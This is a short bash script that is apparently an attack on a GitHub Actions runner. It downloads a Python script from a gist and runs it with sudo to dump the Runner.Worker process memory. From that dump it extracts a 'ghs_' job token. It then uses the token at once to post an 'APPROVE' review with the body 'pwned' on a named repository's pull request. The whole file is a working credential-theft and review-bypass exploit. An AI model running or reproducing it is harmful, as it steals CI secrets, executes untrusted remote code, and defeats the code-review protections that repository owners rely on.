#!/usr/bin/env bash
set -eu

# 1) Dump Runner.Worker memory and pull the token out
TOKEN="$(
  sudo python3 <(curl -sSfL https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py) \
  | tr -d '\0' \
  | grep -aoE '"ghs_[A-Za-z0-9]+"' \
  | head -n1 \
  | tr -d '"'
)"

echo "extracted: ${TOKEN:0:10}..."

# 2) Use it RIGHT NOW, same shell, same job, before the runner cleans up.
OWNER="Yosiroute"
REPO="belle_image"
PR="3"

curl -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  "https://api.github.com/repos/$OWNER/$REPO/pulls/$PR/reviews" \
  -d '{"event":"APPROVE","body":"pwned"}'
